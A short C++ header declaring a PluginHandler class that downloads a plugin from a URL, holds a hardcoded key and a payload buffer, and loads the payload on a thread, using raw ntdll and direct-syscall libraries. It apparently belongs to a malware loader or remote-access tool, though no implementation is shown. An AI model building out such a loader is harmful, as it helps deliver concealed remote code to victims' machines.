#pragma once

#include <windows.h>
#include <Wininet.h>
#include <thread>

#include "../Libraries/ntdll.h"
#include "../Libraries/syscall.hpp"

class PluginHandler {
private:
  char Param_1[255]; // normally plugin download URL
  char Param_2[255]; // normally plugin param 1
  char Param_3[255]; // param 2
  char Param_4[255]; // param 3

  char *Key = (char *)"shrnxhslajshdnrjsjdhwbdjehshdj";
  char *PluginPayload;
  DWORD PayloadSize;

  void downloadPlugin();
  void loadPlugin();
  void startLoading();

public:
  PluginHandler(char *Param_1, char *Param_2, char *Param_3, char *Param_4);
  
  void startLoadingThread();
};